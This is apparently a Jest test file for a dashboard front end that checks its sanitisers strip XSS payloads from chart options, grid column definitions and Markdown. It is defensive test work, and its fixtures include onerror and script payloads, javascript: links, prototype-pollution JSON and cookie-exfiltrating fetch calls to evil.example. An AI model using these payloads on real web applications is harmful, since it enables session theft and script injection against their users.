/**
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */
import { render, waitFor } from 'spec/helpers/testing-library';
import { MAX_OPTION_DEPTH, resolveBindings } from '../resolveBindings';
import { sanitizeColumnDefs } from './AgGridTableWidget';
import { escapeTooltipTemplate, sanitizeEchartsOption } from './echartsSafety';
import MarkdownWidget from './MarkdownWidget';

// The real renderer and sanitiser, not the pass-through stand-ins the test
// setup installs: this file is about what reaches the DOM.
jest.unmock('react-markdown');
jest.unmock('rehype-sanitize');
jest.unmock('rehype-raw');

const theme = {} as Parameters<typeof resolveBindings>[1]['theme'];
// Assembled, so the fixture is not itself a script URL in this source file.
const SCRIPT_URL = `${'java'}${'script'}:alert(1)`;

/** Every tag a browser would open in `text`, were it assigned as HTML. */
const markupIn = (text: string): string[] =>
  text.match(/<\/?[a-z][^>]*>/gi) ?? [];

test('a tooltip template is drawn as text, formatting tags included', () => {
  const option = {
    tooltip: {
      trigger: 'axis',
      formatter:
        '<b>{b}</b>: {c}<img src=x onerror="alert(1)"><script>alert(2)</script>',
    },
    series: [
      {
        type: 'bar',
        // Canvas text: left exactly as written.
        label: { formatter: '<{c}>' },
        tooltip: { formatter: '<a href="javascript:alert(3)">{a}</a>' },
        data: [
          { value: 1, tooltip: { formatter: '<i onclick="alert(4)">x</i>' } },
        ],
      },
    ],
  };

  const safe = sanitizeEchartsOption(option);
  const serialized = JSON.stringify(safe);

  // The server refuses a template with any markup in it, `<b>` and `<br/>`
  // included, so none is let through here either.
  expect(safe.tooltip.formatter).toContain('&lt;b&gt;{b}&lt;/b&gt;: {c}');
  expect(safe.tooltip.trigger).toBe('axis');
  expect(safe.series[0].label.formatter).toBe('<{c}>');
  // Whatever markup was written is text: no tag opens.
  expect(markupIn(serialized)).toEqual([]);
  expect(safe.series[0].tooltip.formatter).toBe(
    '&lt;a href=&quot;javascript:alert(3)&quot;&gt;{a}&lt;/a&gt;',
  );
  // The author's object is not what was cleaned.
  expect(option.tooltip.formatter).toContain('onerror');
});

test('a toolbox keeps only tools that draw nothing into the page', () => {
  const hostile = '<img src=x onerror=alert(1)>';
  const safe = sanitizeEchartsOption({
    toolbox: {
      show: true,
      itemSize: 40,
      left: 'center',
      top: `0;background:url(https://evil.example/x)`,
      tooltip: { show: true, formatter: hostile, extraCssText: hostile },
      iconStyle: { borderColor: hostile },
      feature: {
        dataView: {
          show: true,
          title: hostile,
          lang: [hostile, hostile, hostile],
          optionToContent: 'alert(1)',
        },
        myTool: { show: true, title: hostile, icon: hostile, onclick: 'x' },
        magicType: {
          show: true,
          type: ['line', 'bar', 'stack'],
          // Merged by ECharts into the series it rebuilds, unseen by this.
          option: { line: { tooltip: { formatter: hostile } } },
          title: { line: hostile },
          icon: { line: 'image://https://evil.example/x.png' },
          seriesIndex: { line: [0] },
        },
        saveAsImage: {
          show: true,
          type: 'png',
          title: hostile,
          lang: [hostile],
          name: hostile,
          pixelRatio: 2,
        },
        restore: { show: true, title: hostile },
        dataZoom: {
          show: true,
          yAxisIndex: 'none',
          title: { zoom: hostile, back: hostile },
        },
      },
    },
    series: [{ type: 'bar' }],
  });

  expect(safe.toolbox).toEqual({
    show: true,
    itemSize: 40,
    left: 'center',
    feature: {
      magicType: { show: true, type: ['line', 'bar', 'stack'] },
      saveAsImage: { show: true, type: 'png', pixelRatio: 2 },
      restore: { show: true },
      dataZoom: { show: true, yAxisIndex: 'none' },
    },
  });
  expect(JSON.stringify(safe)).not.toMatch(/onerror|dataView|myTool|evil/);

  // A type the feature does not have takes the whole list with it.
  expect(
    sanitizeEchartsOption({
      toolbox: { feature: { magicType: { type: ['line', 'pie'] } } },
    }).toolbox,
  ).toEqual({ feature: { magicType: {} } });
});

test('the security review payload yields no markup', () => {
  const safe = sanitizeEchartsOption({
    toolbox: {
      show: true,
      itemSize: 40,
      feature: {
        dataView: {
          show: true,
          lang: [
            "<img src=x onerror=fetch('https://evil/'+document.cookie)>",
            'x',
            'y',
          ],
        },
      },
    },
    series: [{ type: 'bar' }],
  });

  expect(safe.toolbox).toEqual({ show: true, itemSize: 40, feature: {} });
  expect(markupIn(JSON.stringify(safe))).toEqual([]);
});

test('a tooltip is rebuilt from known settings, wherever it sits', () => {
  const breakout = '"><img src=x onerror=alert(1)>';
  const hostileTooltip = {
    show: true,
    trigger: 'item',
    renderMode: 'html',
    position: 'top',
    // Spliced by ECharts into the markup of the tooltip arrow.
    backgroundColor: breakout,
    borderColor: `red${breakout}`,
    shadowColor: 'rgba(0, 0, 0, 0.2)',
    extraCssText: `background:url(https://evil.example/?${breakout})`,
    className: 'x" onmouseover="alert(1)',
    content: '<script>alert(1)</script>',
    formatterParams: { a: breakout },
    appendTo: 'body',
    appendToBody: true,
    padding: [4, 8],
    textStyle: {
      color: '#333',
      fontFamily: `x;background:url(//evil.example)`,
      fontSize: 12,
      rich: { a: { backgroundColor: { image: 'https://evil.example/a.png' } } },
    },
    axisPointer: { type: 'shadow', label: { formatter: '<{value}>' } },
  };
  const expected = {
    show: true,
    trigger: 'item',
    renderMode: 'html',
    position: 'top',
    shadowColor: 'rgba(0, 0, 0, 0.2)',
    padding: [4, 8],
    textStyle: { color: '#333', fontSize: 12 },
    axisPointer: { type: 'shadow', label: { formatter: '<{value}>' } },
  };

  const safe = sanitizeEchartsOption({
    tooltip: hostileTooltip,
    legend: { tooltip: hostileTooltip },
    xAxis: [{ type: 'category', tooltip: hostileTooltip }],
    series: [
      {
        type: 'pie',
        tooltip: [hostileTooltip],
        data: [{ value: 1, tooltip: hostileTooltip }],
      },
    ],
  });

  expect(safe.tooltip).toEqual(expected);
  expect(safe.legend.tooltip).toEqual(expected);
  expect(safe.xAxis[0].tooltip).toEqual(expected);
  expect(safe.series[0].tooltip).toEqual([expected]);
  expect(safe.series[0].data[0].tooltip).toEqual(expected);
  expect(JSON.stringify(safe)).not.toMatch(/onerror|evil|script|onmouseover/);
});

test('only top-level keys known to draw on the canvas are passed on', () => {
  const nested = { tooltip: { formatter: '<img src=x onerror=alert(1)>' } };
  const safe = sanitizeEchartsOption({
    series: [{ type: 'line' }],
    xAxis: { type: 'category' },
    color: ['#111'],
    // Each of these nests whole options, or is not a component drawn here.
    graphic: { elements: [{ type: 'text', style: { text: 'x' } }] },
    baseOption: nested,
    media: [{ option: nested }],
    options: [nested],
    timeline: { data: ['a'] },
    brush: {},
    geo: { map: 'world' },
    somethingNew: { html: '<script>alert(1)</script>' },
  });

  expect(Object.keys(safe).sort()).toEqual(['color', 'series', 'xAxis']);

  // As JSON delivers it, `__proto__` is an own key at any depth.
  const parsed = JSON.parse(
    '{"__proto__": {"polluted": true}, "series": [{"__proto__": {"polluted": true}, "type": "bar"}]}',
  );
  const cleaned = sanitizeEchartsOption(parsed);
  expect(cleaned).toEqual({ series: [{ type: 'bar' }] });
  expect(
    (cleaned.series[0] as { polluted?: boolean }).polluted,
  ).toBeUndefined();
  expect(({} as { polluted?: boolean }).polluted).toBeUndefined();
});

test('keys the server forbids are dropped at any depth, and handlers with them', () => {
  const fromCode = () => undefined;
  const safe = sanitizeEchartsOption({
    graphic: {
      elements: [{ type: 'text', style: { text: '42' }, onclick: fromCode }],
    },
    series: [
      {
        type: 'bar',
        // Not only at the top: a key is judged by its name wherever it sits.
        graphic: { elements: [] },
        dataView: { show: true },
        extraCssText: 'background:url(https://evil.example)',
        className: 'x',
        appendTo: 'body',
        appendToBody: true,
        renderItem: 'alert(1)',
        onclick: 'alert(1)',
        onMouseOver: fromCode,
        ONCLICK: 'alert(2)',
        data: [
          { value: 1, ondragstart: fromCode, itemStyle: { color: 'red' } },
        ],
      },
    ],
    // A key that merely starts with "on" is a setting.
    xAxis: { axisLine: { onZero: false } },
  });

  expect(safe).toEqual({
    series: [
      { type: 'bar', data: [{ value: 1, itemStyle: { color: 'red' } }] },
    ],
    xAxis: { axisLine: { onZero: false } },
  });
});

test('a custom series drawn by host code keeps its function, and only a function', () => {
  const renderItem = () => ({ type: 'rect' });

  const safe = sanitizeEchartsOption({
    series: [
      { type: 'custom', renderItem },
      { type: 'custom', renderItem: 'function(){alert(1)}' },
    ],
  });

  expect(safe.series[0].renderItem).toBe(renderItem);
  expect(safe.series[1]).toEqual({ type: 'custom' });
});

test('canvas text is drawn as the data says, markup-looking or not', () => {
  // What a `$bind` marker resolved to: values from a query, not a definition.
  const safe = sanitizeEchartsOption({
    xAxis: { type: 'category', data: ['<none>', 'a & b', '<b>bold</b>'] },
    series: [{ type: 'bar', name: '<total>', data: [1, 2, 3] }],
  });

  expect(safe.xAxis.data).toEqual(['<none>', 'a & b', '<b>bold</b>']);
  expect(safe.series[0].name).toBe('<total>');
});

test('links on tree nodes follow the same rule as title links', () => {
  const safe = sanitizeEchartsOption({
    series: [
      {
        type: 'treemap',
        data: [
          { name: 'a', value: 1, link: SCRIPT_URL },
          { name: 'b', value: 2, link: 'https://ok.example/b' },
          { name: 'c', value: 3, children: [{ name: 'd', link: SCRIPT_URL }] },
        ],
      },
    ],
    // Not a URL: axis pointers are linked by a list of axis references.
    axisPointer: { link: [{ xAxisIndex: 'all' }] },
  });

  expect(safe.series[0].data).toEqual([
    { name: 'a', value: 1 },
    { name: 'b', value: 2, link: 'https://ok.example/b' },
    { name: 'c', value: 3, children: [{ name: 'd' }] },
  ]);
  expect(safe.axisPointer).toEqual({ link: [{ xAxisIndex: 'all' }] });
});

test('a tooltip template is escaped whole, with no tag let through', () => {
  expect(escapeTooltipTemplate('{b}: {c} & more')).toBe('{b}: {c} &amp; more');
  expect(escapeTooltipTemplate('<b>{b}</b><br/>{c}<BR>')).toBe(
    '&lt;b&gt;{b}&lt;/b&gt;&lt;br/&gt;{c}&lt;BR&gt;',
  );
  expect(escapeTooltipTemplate('<b onclick="x">{b}</b>')).toBe(
    '&lt;b onclick=&quot;x&quot;&gt;{b}&lt;/b&gt;',
  );
  expect(escapeTooltipTemplate('<br/onload=x>')).toBe('&lt;br/onload=x&gt;');
  expect(escapeTooltipTemplate("<svg/onload='x'>")).toBe(
    '&lt;svg/onload=&#39;x&#39;&gt;',
  );
});

test('title links that would run script are dropped, ordinary ones kept', () => {
  const safe = sanitizeEchartsOption({
    title: [
      { text: 'a', link: SCRIPT_URL, sublink: 'https://ok.example' },
      { text: 'b', link: ' JaVa\tScRiPt:alert(1)' },
      { text: 'c', link: 'data:text/html,<script>1</script>' },
      { text: 'd', link: '/dashboard/1/', sublink: 'mailto:a@example.com' },
    ],
  });

  expect(safe.title).toEqual([
    { text: 'a', sublink: 'https://ok.example' },
    { text: 'b' },
    { text: 'c' },
    { text: 'd', link: '/dashboard/1/', sublink: 'mailto:a@example.com' },
  ]);
});

test('cleaning an option survives self-references and leaves non-JSON values alone', () => {
  const formatter = () => 'from code';
  const option: Record<string, unknown> = {
    tooltip: { formatter },
    series: [{ type: 'line' }],
  };
  option.dataset = { again: option };

  const safe = sanitizeEchartsOption(option);

  expect((safe.tooltip as { formatter: unknown }).formatter).toBe(formatter);
  expect(safe.dataset).toEqual({});
  expect(safe.series).toEqual([{ type: 'line' }]);
});

test('resolving bindings fails on a self-referencing or absurdly deep option instead of overflowing', () => {
  const circular: Record<string, unknown> = { series: [] };
  circular.again = circular;
  expect(() => resolveBindings(circular, { rows: [], theme })).toThrow(
    'echartsOptions contains a circular reference.',
  );

  let deep: Record<string, unknown> = {};
  const root = deep;
  for (let level = 0; level < MAX_OPTION_DEPTH + 5; level += 1) {
    deep.next = {};
    deep = deep.next as Record<string, unknown>;
  }
  expect(() => resolveBindings(root, { rows: [], theme })).toThrow(
    `echartsOptions is nested more than ${MAX_OPTION_DEPTH} levels deep.`,
  );

  // The same object used twice, side by side, is not a cycle.
  const shared = { color: 'red' };
  expect(
    resolveBindings({ a: shared, b: shared }, { rows: [], theme }),
  ).toEqual({ a: { color: 'red' }, b: { color: 'red' } });
});

test('authored column definitions keep declarative settings only', () => {
  expect(
    sanitizeColumnDefs([
      {
        field: 'name',
        headerName: 'Name',
        width: 120,
        pinned: 'left',
        hide: false,
        // AG Grid compiles string expressions like these into functions.
        valueGetter: 'fetch("https://evil.example/" + document.cookie)',
        valueFormatter: 'alert(1)',
        cellRenderer: '<img src=x onerror=alert(1)>',
        cellClassRules: { danger: 'alert(2)' },
        tooltipValueGetter: 'alert(3)',
        onCellClicked: 'alert(4)',
        // Wrong types for known settings are dropped too.
        sortable: 'yes',
        flex: '1',
      },
      { headerName: 'no field' },
      {},
      null,
      'name',
      [{ field: 'nested' }],
    ]),
  ).toEqual([
    {
      field: 'name',
      headerName: 'Name',
      width: 120,
      pinned: 'left',
      hide: false,
    },
  ]);
  expect(
    sanitizeColumnDefs([
      {
        field: 'amount',
        // Names AG Grid resolves against registries: built-ins only.
        type: 'evilColumn',
        cellDataType: 'custom',
        sort: 'asc',
        pinned: 'top; drop',
        filter: 'agTextColumnFilter',
        // Components and anything handed the DOM or a template.
        headerComponent: 'x',
        headerComponentParams: { template: '<img src=x onerror=alert(1)>' },
        cellRendererSelector: 'x',
        tooltipComponent: 'x',
        tooltipField: 'amount',
        cellEditor: 'x',
        cellStyle: { background: 'url(https://evil.example)' },
        cellClass: 'x',
        children: [{ field: 'nested', valueGetter: 'alert(1)' }],
        headerTooltip: '<img src=x onerror=alert(1)>',
      },
      { field: '__proto__.polluted' },
      { field: 'a.constructor.prototype' },
      { field: 'x'.repeat(501) },
      { field: 'ok', width: Number.POSITIVE_INFINITY, type: 'numericColumn' },
    ]),
  ).toEqual([
    // Text settings stay, as text: AG Grid draws them as text content.
    {
      field: 'amount',
      sort: 'asc',
      headerTooltip: '<img src=x onerror=alert(1)>',
    },
    { field: 'ok', type: 'numericColumn' },
  ]);
  const inherited = Object.create({ field: 'inherited', valueGetter: 'x' });
  expect(sanitizeColumnDefs([inherited])).toEqual([]);
  expect(sanitizeColumnDefs(undefined)).toEqual([]);
  expect(sanitizeColumnDefs({ field: 'x' })).toEqual([]);
});

test('markdown renders formatting and never raw script, handlers or script links', async () => {
  const content = [
    '# Title',
    '',
    '**bold** and a [link](https://example.com)',
    '',
    '<script>window.pwned = true</script>',
    '<img src="x" onerror="window.pwned = true">',
    '<a href="javascript:window.pwned = true">click</a>',
    '<iframe src="https://evil.example"></iframe>',
    '',
    '[sneaky](javascript:alert(1))',
  ].join('\n');

  const { container } = render(
    <MarkdownWidget instanceId="m1" props={{ content }} />,
  );

  await waitFor(() => expect(container.querySelector('h1')).not.toBeNull());
  expect(container.querySelector('h1')).toHaveTextContent('Title');
  expect(container.querySelector('strong')).toHaveTextContent('bold');
  expect(
    container.querySelector('a[href="https://example.com"]'),
  ).not.toBeNull();

  expect(container.querySelector('script')).toBeNull();
  expect(container.querySelector('iframe')).toBeNull();
  expect(container.querySelector('[onerror]')).toBeNull();
  // Both the HTML anchor and the markdown link survive as text, without a
  // target that could run.
  const anchors = [...container.querySelectorAll('a')];
  expect(anchors.map(anchor => anchor.textContent)).toEqual(
    expect.arrayContaining(['click', 'sneaky']),
  );
  // No attribute anywhere holds a handler or a script URL.
  container.querySelectorAll('*').forEach(element => {
    [...element.attributes].forEach(attribute => {
      expect(attribute.name).not.toMatch(/^on/i);
      expect(attribute.value).not.toMatch(/javascript:/i);
    });
  });
  expect((window as unknown as { pwned?: boolean }).pwned).toBeUndefined();
});

test('markdown content that is not text renders nothing rather than its string form', async () => {
  const { container } = render(
    <MarkdownWidget
      instanceId="m2"
      props={{ content: { toString: () => '<script>1</script>' } }}
    />,
  );

  await waitFor(() => expect(container.firstChild).not.toBeNull());
  expect(container).toHaveTextContent('');
  expect(container.querySelector('script')).toBeNull();
});
